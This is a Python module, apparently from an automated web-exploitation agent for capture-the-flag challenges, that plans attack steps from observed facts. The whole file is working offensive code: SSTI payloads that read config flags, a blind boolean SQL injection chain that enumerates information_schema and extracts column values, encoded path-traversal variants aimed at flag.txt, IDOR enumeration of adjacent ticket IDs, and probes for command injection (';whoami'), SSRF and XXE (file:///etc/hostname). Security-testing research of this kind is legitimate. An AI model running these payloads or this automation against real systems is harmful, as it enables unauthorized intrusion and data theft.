"""Blackboard-driven strategy recipes for the canonical Muteki runtime.

The production runtime deliberately keeps this module deterministic.  It does
not contain challenge answers; it turns observed Graph facts into bounded next
intents.  This is the small, explicit strategy layer between Muteki Reason and
the existing Tool Gateway.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass
from typing import Any, Mapping
from urllib.parse import urljoin, urlparse

from .adapter.official_observation import parse_safe_observation
from .recon.fingerprint import ClassificationResult, classify_challenge

_SSTI_PROBES: tuple[str, ...] = (
    "{{7*7}}",
    "{{ config['FLAG'] }}",
    "{{ config['CHALLENGE_FLAG'] }}",
    "{{ config['CTF_FLAG'] }}",
)


def _fact_value(content: str) -> dict[str, Any]:
    """Decode a JSON fact or return an empty value for legacy text facts."""

    native = parse_safe_observation(content)
    if native:
        extraction_strategy = native.get("extraction_strategy")
        if extraction_strategy:
            native["adaptive_extraction_profile"] = {
                "extraction_strategy": extraction_strategy,
            }
        return native
    try:
        value = json.loads(content)
    except (TypeError, ValueError):
        value = None
    if isinstance(value, dict):
        return value
    # ToolAdapter facts intentionally use a compact, non-raw text format.
    # Parse its safe fields so strategy selection remains independent of the
    # old SolverState projection.
    result: dict[str, Any] = {}
    for key, raw in re.findall(r"(?:^|;)\s*([a-z_]+)=([^;]+)", content):
        result[key] = raw.strip()
    observed = re.search(r"; observed=(\{.*\})(?:; summary=|$)", content)
    if observed:
        try:
            details = json.loads(observed.group(1))
        except (TypeError, ValueError):
            details = {}
        if isinstance(details, dict):
            result.update(details)
    if "success" in result:
        result["success"] = str(result["success"]).casefold() == "true"
    return result


def _facts(snapshot: Mapping[str, Any]) -> list[dict[str, Any]]:
    values: list[dict[str, Any]] = []
    for item in snapshot.get("facts", ()):
        content = item.get("content") if isinstance(item, Mapping) else ""
        if isinstance(content, str):
            value = _fact_value(content)
            if isinstance(item, Mapping) and item.get("evidence_refs"):
                value["evidence_refs"] = list(item.get("evidence_refs") or ())
            values.append(value)
    return [item for item in values if item]


def _evidence_refs(records: list[dict[str, Any]]) -> list[str]:
    refs: list[str] = []
    for record in records:
        for value in record.get("evidence_refs", ()) or ():
            text = str(value)
            if text and text not in refs:
                refs.append(text)
    return refs


def _requested_urls(snapshot: Mapping[str, Any]) -> set[str]:
    values: set[str] = set()
    for item in snapshot.get("facts", ()):
        content = item.get("content") if isinstance(item, Mapping) else ""
        if isinstance(content, str):
            values.update(re.findall(r"request_url=([^;\s]+)", content, flags=re.IGNORECASE))
    return values


def _successful_tool(records: list[dict[str, Any]], name: str) -> bool:
    return any(
        record.get("tool") == name and bool(record.get("success"))
        for record in records
    )


def _successful_records(records: list[dict[str, Any]], name: str) -> list[dict[str, Any]]:
    return [
        record
        for record in records
        if record.get("tool") == name and bool(record.get("success"))
    ]


def _oracle_confirmed(records: list[dict[str, Any]]) -> bool:
    return any(
        record.get("boolean_oracle_confirmed") is True
        or record.get("oracle_verified") is True
        for record in _successful_records(records, "sql_boolean_compare")
    )


def _tried_fields(records: list[dict[str, Any]]) -> set[str]:
    return {
        str(record.get("test_field"))
        for record in _successful_records(records, "sql_boolean_compare")
        if record.get("test_field")
    }


def _failed_route(snapshot: Mapping[str, Any], *names: str) -> bool:
    dead_ends = " ".join(
        str(item.get("description") or "")
        for item in snapshot.get("dead_ends", ())
        if isinstance(item, Mapping)
    ).casefold()
    return any(name.casefold() in dead_ends for name in names)


def _observed_endpoint(records: list[dict[str, Any]], target: str) -> list[str]:
    """Return same-host endpoints found by Race or HTTP observations."""

    host = urlparse(target).netloc.casefold()
    candidates: list[str] = []
    for record in records:
        for key in ("endpoint", "final_url"):
            value = record.get(key)
            if isinstance(value, str) and value:
                candidates.append(value)
        for key in ("links", "form_actions"):
            for value in record.get(key, ()) or ():
                if isinstance(value, str):
                    candidates.append(value)
    result: list[str] = []
    for value in candidates:
        url = urljoin(target, value)
        parsed = urlparse(url)
        if parsed.scheme in {"http", "https"} and parsed.netloc.casefold() == host and url not in result:
            result.append(url)
    return result


@dataclass(frozen=True, slots=True)
class MutekiStrategyPlanner:
    """Select bounded intents from the current canonical Graph snapshot."""

    target_url: str
    metadata: Mapping[str, Any]
    public_credentials: tuple[str, str] | None = None

    def plan(self, snapshot: Mapping[str, Any]) -> list[dict[str, Any]]:
        records = _facts(snapshot)
        classification = classify_challenge(self.metadata, snapshot.get("facts", ()))
        if classification and classification.confidence >= 70:
            if classification.classification == "SQLI":
                return self._sql_plan(records, snapshot)
            return self._classified_web_plan(classification, records, snapshot)
        return self._recon_plan(records, snapshot)

    def _sql_plan(self, records: list[dict[str, Any]], snapshot: Mapping[str, Any]) -> list[dict[str, Any]]:
        metadata = dict(self.metadata)
        fields = [str(value) for value in metadata.get("fields", ()) if str(value)]
        controls = dict(metadata.get("control_values") or {})
        field = fields[0] if fields else "query"
        request = {
            "method": str(metadata.get("method") or "POST").upper(),
            "url": urljoin(self.target_url.rstrip("/") + "/", str(metadata.get("endpoint") or "/").lstrip("/")),
            "headers": {"Content-Type": str(metadata.get("content_type") or "application/json")},
            "json": controls,
        }
        common = {
            "request": request,
            "test_field": field,
            "control_fields": {key: value for key, value in controls.items() if key != field},
            "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
            "baseline_value": str(controls.get(field) or ""),
        }
        boolean_records = _successful_records(records, "sql_boolean_compare")
        if not boolean_records:
            attempted_fields = {
                str(record.get("test_field"))
                for record in records
                if record.get("tool") == "sql_boolean_compare"
                and record.get("test_field")
            }
            next_field = next(
                (candidate for candidate in fields if candidate not in attempted_fields),
                None,
            )
            if next_field is not None:
                next_common = {
                    **common,
                    "test_field": next_field,
                    "control_fields": {
                        key: value for key, value in controls.items() if key != next_field
                    },
                    "baseline_value": str(controls.get(next_field) or ""),
                }
                return [self._intent(
                    f"sql_boolean_compare:{next_field}",
                    "The previous declared field did not establish a Boolean oracle; test the next declared field.",
                    {**next_common, "max_requests": 5},
                )]
            # Canonical Muteki keeps concluded intents on the SharedGraph and
            # feeds them back to Reason so an exhausted direction is not
            # proposed again.  The adapter has the same information as safe
            # action facts; once every declared field was attempted, retire
            # this bounded Boolean route instead of replaying the first field.
            if attempted_fields:
                return []
            if _failed_route(snapshot, "sql_boolean_compare"):
                return []
            return [self._intent(
                f"sql_boolean_compare:{field}",
                "Confirm a bounded Boolean oracle on the declared SQL surface.",
                {**common, "max_requests": 5},
            )]

        refs = _evidence_refs(records)
        if not refs:
            return []
        if not _oracle_confirmed(records):
            next_field = next((candidate for candidate in fields if candidate not in _tried_fields(records)), None)
            if next_field is not None:
                next_common = {
                    **common,
                    "test_field": next_field,
                    "control_fields": {key: value for key, value in controls.items() if key != next_field},
                    "baseline_value": str(controls.get(next_field) or ""),
                }
                return [self._intent(
                    f"sql_boolean_compare:{next_field}",
                    "The first declared field did not establish a Boolean oracle; test the next declared field.",
                    {**next_common, "max_requests": 5},
                )]
            return []
        confirmed = next(
            (
                record
                for record in reversed(boolean_records)
                if record.get("boolean_oracle_confirmed") is True
                or record.get("oracle_verified") is True
            ),
            {},
        )
        active_field = str(confirmed.get("test_field") or field)
        active_common = {
            **common,
            "test_field": active_field,
            "control_fields": {key: value for key, value in controls.items() if key != active_field},
            "baseline_value": str(controls.get(active_field) or ""),
        }
        if not _successful_tool(records, "oracle_expression_calibration"):
            if _failed_route(snapshot, "oracle_expression_calibration", "repeated route without progress"):
                return []
            return [self._intent(
                "oracle_expression_calibration",
                "Calibrate the verified Boolean oracle before metadata discovery.",
                {
                    **active_common,
                    "dbms": str(metadata.get("dbms") or "mysql"),
                    "predicate_template": "' AND {predicate} -- ",
                    "matrix": [
                        {"level": 2, "name": "substring", "primitive": "substring", "function": "SUBSTRING", "true": "SUBSTRING('ABC',1,1)='A'", "false": "SUBSTRING('ABC',1,1)='B'", "capability": "substring_supported"},
                        {"level": 2, "name": "hex_substring", "primitive": "hex", "function": "HEX", "true": "HEX(SUBSTRING('ABC',1,1))='41'", "false": "HEX(SUBSTRING('ABC',1,1))='42'", "capability": "hex_supported"},
                        {"level": 3, "name": "scalar_subquery", "true": "(SELECT 1)=1", "false": "(SELECT 1)=2", "capability": "scalar_subquery_oracle_confirmed"},
                        {"level": 4, "name": "mysql_hex", "true": "HEX('A')='41'", "false": "HEX('A')='42'", "capability": "mysql_dbms_confirmed"},
                    ],
                    "supporting_evidence_ids": refs,
                    "max_calibration_requests": 160,
                },
            )]

        table_names = self._names_from_records(records, "tables")
        column_names = self._names_from_records(records, "columns")
        extraction_profile = next(
            (
                record.get("adaptive_extraction_profile")
                for record in reversed(records)
                if isinstance(record.get("adaptive_extraction_profile"), Mapping)
                and record.get("adaptive_extraction_profile", {}).get("extraction_strategy")
            ),
            {},
        )
        metadata_records = _successful_records(records, "mysql_metadata_discovery")
        metadata_attempts = [
            record for record in records if record.get("tool") == "mysql_metadata_discovery"
        ]
        attempted_targets = {
            str(record.get("target_expression") or "").casefold()
            for record in metadata_attempts
        }
        if "database()" in attempted_targets and "information_schema.tables" not in attempted_targets:
            return [self._intent(
                "mysql_metadata_discovery:tables",
                "The database-name probe produced no distinguishable fact; switch once to the allowlisted table enumeration route.",
                {
                    **active_common,
                    "dbms": "mysql",
                    "target_expression": "information_schema.tables",
                    "expression_type": "METADATA_DISCOVERY",
                    "extraction_profile": dict(extraction_profile),
                    "supporting_evidence_ids": refs,
                    "stage": "tables",
                    "max_tables": 10,
                    "max_columns": 30,
                    "max_name_length": 128,
                    "max_requests": 2000,
                },
                tool_name="mysql_metadata_discovery",
            )]
        if not metadata_records:
            if attempted_targets:
                return []
            return [self._intent(
                "mysql_metadata_discovery:database",
                "Identify the current database before enumerating its allowlisted metadata surface.",
                {
                    **active_common,
                    "dbms": "mysql",
                    "target_expression": "DATABASE()",
                    "expression_type": "METADATA_DISCOVERY",
                    "extraction_profile": dict(extraction_profile),
                    "supporting_evidence_ids": refs,
                    "stage": "database",
                    "max_requests": 2000,
                },
                tool_name="mysql_metadata_discovery",
            )]
        metadata_targets = {
            str(record.get("target_expression") or "").casefold()
            for record in metadata_records
        }
        if not table_names:
            if "information_schema.tables" in metadata_targets:
                return []
            return [self._intent(
                "mysql_metadata_discovery:tables",
                "Enumerate current-database tables through the verified oracle.",
                {**active_common, "dbms": "mysql", "discovery_scope": "current_database", "target_expression": "information_schema.tables", "expression_type": "METADATA_DISCOVERY", "extraction_profile": dict(extraction_profile), "supporting_evidence_ids": refs, "stage": "tables", "max_tables": 10, "max_columns": 30, "max_name_length": 128, "max_requests": 2000},
                tool_name="mysql_metadata_discovery",
            )]
        if not column_names:
            if "information_schema.columns" in attempted_targets:
                return []
            return [self._intent(
                "mysql_metadata_discovery:columns",
                "Enumerate columns for the first evidence-backed table.",
                {**active_common, "dbms": "mysql", "discovery_scope": "current_database", "target_expression": "information_schema.columns", "candidate_table": table_names[0], "expression_type": "METADATA_DISCOVERY", "extraction_profile": dict(extraction_profile), "supporting_evidence_ids": refs, "stage": "columns", "max_tables": 10, "max_columns": 30, "max_name_length": 128, "max_requests": 2000},
                tool_name="mysql_metadata_discovery",
            )]
        extraction_attempts = [
            record for record in records if record.get("tool") == "boolean_config_extract"
        ]
        if extraction_attempts:
            # The official Worker owns the flag provenance gate.  Once this
            # bounded extraction route has run, do not silently replay it when
            # no gated flag was produced; Review or a future explicit branch
            # must choose a materially different route.
            return []
        table = table_names[0]
        candidate = next((name for name in column_names if name.casefold() in {"flag", "secret", "value", "answer"}), column_names[0])
        return [self._intent(
            "boolean_config_extract:flag",
            "Extract a bounded candidate value from the verified table and column evidence.",
            {**active_common, "dbms": "mysql", "target_expression": f"SELECT {candidate} FROM {table} LIMIT 1", "expression_type": "FLAG_SEARCH", "extraction_profile": dict(extraction_profile), "supporting_evidence_ids": refs, "max_requests": 512, "max_length": 128},
            tool_name="boolean_config_extract",
        )]

    def _classified_web_plan(self, classification: ClassificationResult, records: list[dict[str, Any]], snapshot: Mapping[str, Any]) -> list[dict[str, Any]]:
        requested = _requested_urls(snapshot)
        authenticated = any(
            record.get("tool") == "http_session_request"
            and bool(record.get("success"))
            and str(record.get("request_method") or "").upper() == "POST"
            and "/login" in str(record.get("request_url") or "").casefold()
            for record in records
        )
        if self.public_credentials and not authenticated:
            username, password = self.public_credentials
            target = self.target_url.rstrip("/")
            return [self._intent(
                "authenticate using credentials explicitly disclosed by the target",
                "Race observed a public demo account; establish one bounded session before probing protected business routes.",
                {
                    "session_name": "muteki-recon",
                    "method": "POST",
                    "url": f"{target}/login",
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "body": f"username={username}&password={password}",
                    "follow_redirects": False,
                },
                tool_name="http_session_request",
                worker_class="exploit",
                classification=classification.classification,
            )]
        if classification.classification == "IDOR":
            return self._idor_plan(records, snapshot, authenticated=authenticated)
        if classification.classification == "PATH_TRAVERSAL":
            return self._path_traversal_plan(snapshot)
        if classification.classification == "SSTI":
            template_endpoint = _next_template_endpoint(records, self.target_url, requested)
            if template_endpoint:
                return [self._intent(
                    f"inspect observed template {urlparse(template_endpoint).path or '/'}",
                    "Open one discovered template object before submitting a preview payload.",
                    {
                        "session_name": "muteki-recon",
                        "method": "GET",
                        "url": template_endpoint,
                        "follow_redirects": False,
                    },
                    tool_name="http_session_request",
                    worker_class="recon",
                    classification=classification.classification,
                )]
            probe_index = _ssti_probe_index(records)
            form_action = _next_post_form(
                records,
                self.target_url,
                requested,
                allow_repeat=probe_index > 0,
            )
            if form_action and probe_index < len(_SSTI_PROBES):
                payload = _SSTI_PROBES[probe_index]
                probe_label = "baseline" if probe_index == 0 else f"config-key-{probe_index}"
                return [self._intent(
                    f"validate SSTI {probe_label} through form {urlparse(form_action).path or '/'}",
                    "Submit one bounded template expression to an observed preview form in the existing session.",
                    {
                        "session_name": "muteki-recon",
                        "method": "POST",
                        "url": form_action,
                        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                        "body": f"body={payload}",
                        "follow_redirects": False,
                    },
                    tool_name="http_session_request",
                    worker_class="exploit",
                    classification=classification.classification,
                )]
        endpoints = _observed_endpoint(records, self.target_url)
        endpoint = next((value for value in endpoints if value not in requested), None)
        if endpoint is None:
            return []
        tool = "http_session_request" if authenticated else "http_request"
        params = {"method": "GET", "url": endpoint, "follow_redirects": False}
        if authenticated:
            params["session_name"] = "muteki-recon"
        if classification.classification == "JWT":
            tool = "http_session_request"
            params = {"session_name": "muteki-recon", "method": "GET", "url": endpoint, "follow_redirects": False}
        elif classification.classification in {"SSTI", "COMMAND_INJECTION", "SSRF", "XXE"}:
            params["query"] = self._bounded_probe_query(classification.classification, records)
        return [self._intent(
            f"explore {classification.classification.lower()} surface at {urlparse(endpoint).path or '/'}",
            f"Explore an evidence-backed {classification.classification} surface with one bounded request.",
            params,
            tool_name=tool,
            worker_class="exploit" if classification.classification != "JWT" else "recon",
            classification=classification.classification,
        )]

    def _idor_plan(
        self,
        records: list[dict[str, Any]],
        snapshot: Mapping[str, Any],
        *,
        authenticated: bool,
    ) -> list[dict[str, Any]]:
        """Advance an IDOR route from observed session and object facts.

        The planner owns the generic object-lifecycle policy. It never invents
        credentials or object values; those must come from Race/Observation
        facts or from the target's same-origin ticket convention.
        """

        target = self.target_url.rstrip("/")
        requested = _requested_urls(snapshot)
        if not authenticated:
            return []
        ticket_url = next(
            (
                endpoint
                for endpoint in _observed_endpoint(records, self.target_url)
                if urlparse(endpoint).path.rstrip("/").casefold() == "/tickets"
                and endpoint.casefold() not in {item.casefold() for item in requested}
            ),
            f"{target}/tickets",
        )
        if ticket_url.casefold() not in {item.casefold() for item in requested}:
            return [self._intent(
                "open the authenticated ticket collection",
                "The same session is authenticated; enumerate the authorized ticket list.",
                {"session_name": "muteki-recon", "method": "GET", "url": ticket_url, "follow_redirects": False},
                tool_name="http_session_request",
                classification="IDOR",
            )]

        facts = _fact_text(snapshot)
        ticket_match = re.search(r"/tickets/(WO-[A-Za-z0-9-]+)", facts, re.IGNORECASE)
        if ticket_match and "/api/tickets/" not in facts.casefold():
            ticket = ticket_match.group(1)
            return [self._intent(
                "read the discovered ticket API object",
                "The authenticated ticket page disclosed an object reference; validate the same-object API response.",
                {"session_name": "muteki-recon", "method": "GET", "url": f"{target}/api/tickets/{ticket}", "follow_redirects": False},
                tool_name="http_session_request",
                classification="IDOR",
            )]
        if "/api/tickets/" in facts.casefold() and "download_url" not in facts.casefold():
            observed = re.findall(r"/api/tickets/(WO-[A-Za-z0-9-]+)", facts, re.IGNORECASE)
            candidate = _next_idor_ticket(observed, facts)
            if candidate:
                return [self._intent(
                    f"test adjacent ticket object {candidate}",
                    "The authenticated API exposed an object identifier; test a bounded adjacent identifier for authorization isolation.",
                    {"session_name": "muteki-recon", "method": "GET", "url": f"{target}/api/tickets/{candidate}", "follow_redirects": False},
                    tool_name="http_session_request",
                    classification="IDOR",
                )]
        report_match = re.search(r"download_url\s*[\"']?\s*[:=]\s*[\"']?([^\"'\s,}]+)", facts, re.IGNORECASE)
        if report_match:
            report_url = urljoin(target + "/", report_match.group(1))
            return [self._intent(
                "retrieve the referenced diagnostic report",
                "The ticket API returned an evidence-backed diagnostic report reference.",
                {"session_name": "muteki-recon", "method": "GET", "url": report_url, "follow_redirects": False},
                tool_name="http_session_request",
                classification="IDOR",
            )]
        return []

    def _path_traversal_plan(self, snapshot: Mapping[str, Any]) -> list[dict[str, Any]]:
        """Try bounded path variants only after a preview route was observed."""

        preview_url, disclosed_paths, requested = _preview_context(snapshot)
        if not preview_url:
            return []
        candidates: list[str] = []
        for path in disclosed_paths:
            candidates.extend((
                f"public/../{path}",
                f"public%2F..%2F{path.replace('/', '%2F')}",
                f"public%2F%252e%252e%2F{path.replace('/', '%2F')}",
                f"public%252F..%252F{path.replace('/', '%252F')}",
            ))
        candidates.extend(("../flag.txt", "../../flag.txt", "../private/flag.txt", "../../private/flag.txt"))
        for candidate in candidates:
            if any(candidate in value for value in requested):
                continue
            url = re.sub(r"([?&]path=)[^&]*", rf"\g<1>{candidate}", preview_url, count=1)
            if "path=" not in url:
                url = f"{preview_url}{'&' if '?' in preview_url else '?'}path={candidate}"
            return [self._intent(
                f"validate legacy preview path {candidate}",
                "A same-host preview path and migration archive reference were observed; test bounded legacy path variants only.",
                {"method": "GET", "url": url, "follow_redirects": False},
                tool_name="http_request",
                classification="PATH_TRAVERSAL",
            )]
        return []

    def _recon_plan(self, records: list[dict[str, Any]], snapshot: Mapping[str, Any]) -> list[dict[str, Any]]:
        requested = _requested_urls(snapshot)
        endpoint = next((value for value in _observed_endpoint(records, self.target_url) if value not in requested), None)
        if endpoint is None:
            return []
        return [self._intent(
            f"EXPLORE_ENDPOINTS {urlparse(endpoint).path or '/'}",
            "Classification is not high confidence; inspect one newly observed endpoint before exploitation.",
            {"method": "GET", "url": endpoint, "follow_redirects": False},
            tool_name="http_request",
            worker_class="recon",
            classification="GENERIC_WEB",
        )]

    @staticmethod
    def _names_from_records(records: list[dict[str, Any]], key: str) -> list[str]:
        values: list[str] = []
        for record in records:
            for item in record.get(key, ()) or ():
                if isinstance(item, Mapping):
                    value = item.get("name") or item.get("table_name") or item.get("column_name")
                else:
                    value = item
                if value and str(value) not in values:
                    values.append(str(value))
        return values

    @staticmethod
    def _bounded_probe_query(classification: str, records: list[dict[str, Any]]) -> dict[str, str]:
        parameters = [str(value) for record in records for value in (record.get("parameter_names") or ()) if str(value)]
        name = parameters[0] if parameters else "q"
        payload = {
            "SSTI": "{{7*7}}",
            "COMMAND_INJECTION": ";whoami",
            "SSRF": "http://127.0.0.1/",
            "XXE": "<!DOCTYPE a SYSTEM 'file:///etc/hostname'>",
        }[classification]
        return {name: payload}

    @staticmethod
    def _intent(goal: str, reason: str, arguments: dict[str, Any], *, tool_name: str | None = None, worker_class: str = "exploit", classification: str = "SQLI") -> dict[str, Any]:
        return {"goal": goal, "worker_class": worker_class, "rationale": reason, "payload": {"tool_name": tool_name or goal.split(":", 1)[0], "arguments": arguments, "classification": classification}}


__all__ = ["MutekiStrategyPlanner"]


def _fact_text(snapshot: Mapping[str, Any]) -> str:
    return "\n".join(
        str(item.get("content") or "")
        for item in snapshot.get("facts", ())
        if isinstance(item, Mapping)
    )


def _preview_context(snapshot: Mapping[str, Any]) -> tuple[str | None, list[str], set[str]]:
    preview_url: str | None = None
    disclosed_paths: list[str] = []
    requested: set[str] = set()
    for item in snapshot.get("facts", ()):
        if not isinstance(item, Mapping):
            continue
        content = str(item.get("content") or "")
        requested.update(re.findall(r"request_url=([^;\s]+)", content, re.IGNORECASE))
        try:
            value = json.loads(content)
        except (TypeError, ValueError):
            value = {}
        if not isinstance(value, Mapping):
            continue
        candidates = list(value.get("links") or ()) + [value.get("endpoint")]
        for candidate in candidates:
            text = str(candidate or "")
            if "/preview" in text.casefold() and "path=" in text.casefold() and preview_url is None:
                preview_url = text
        disclosed_paths.extend(str(path) for path in value.get("disclosed_paths", ()) if path)
    return preview_url, list(dict.fromkeys(disclosed_paths)), requested


def _next_idor_ticket(observed_api_tickets: list[str], facts: str) -> str | None:
    """Return a bounded adjacent ticket id that has not been requested."""

    if not observed_api_tickets:
        return None
    match = re.match(r"^(.*?)(\d+)$", observed_api_tickets[-1])
    if not match:
        return None
    prefix, number = match.groups()
    base = int(number)
    requested = {item.casefold() for item in re.findall(r"request_url=([^;\s]+/api/tickets/[^;\s]+)", facts, re.IGNORECASE)}
    for offset in (1, 2, 3, 4, 5, -1, -2):
        candidate = f"{prefix}{base + offset:0{len(number)}d}"
        if f"/api/tickets/{candidate}".casefold() not in requested:
            return candidate
    return None


def _next_post_form(
    records: list[dict[str, Any]],
    target: str,
    requested: set[str],
    *,
    allow_repeat: bool = False,
) -> str | None:
    """Return one observed same-origin POST form action not yet submitted."""

    origin = urlparse(target).netloc.casefold()
    requested_folded = {str(item).casefold() for item in requested}
    candidates: list[str] = []
    for record in records:
        actions = record.get("form_actions") or ()
        methods = [str(item).upper() for item in (record.get("form_methods") or ())]
        for index, action in enumerate(actions):
            value = urljoin(target, str(action))
            if urlparse(value).netloc.casefold() != origin or (not allow_repeat and value.casefold() in requested_folded):
                continue
            if index < len(methods) and methods[index] == "POST":
                candidates.append(value)
    return next((value for value in candidates if "/preview" in value.casefold()), candidates[0] if candidates else None)


def _ssti_probe_index(records: list[dict[str, Any]]) -> int:
    """Advance through the fixed SSTI probe list after successful previews."""

    return min(
        sum(
            1
            for record in records
            if record.get("tool") == "http_session_request"
            and bool(record.get("success"))
            and "/preview" in str(record.get("request_url") or "").casefold()
        ),
        len(_SSTI_PROBES),
    )


def _next_template_endpoint(records: list[dict[str, Any]], target: str, requested: set[str]) -> str | None:
    """Return one observed same-origin template object, excluding create routes."""

    origin = urlparse(target).netloc.casefold()
    requested_folded = {str(item).casefold() for item in requested}
    candidates: list[str] = []
    for value in _observed_endpoint(records, target):
        parsed = urlparse(value)
        path = parsed.path.casefold().rstrip("/")
        if parsed.netloc.casefold() != origin or value.casefold() in requested_folded:
            continue
        if path.startswith("/templates/") and path not in {"/templates/new", "/templates"}:
            candidates.append(value)
    return candidates[0] if candidates else None
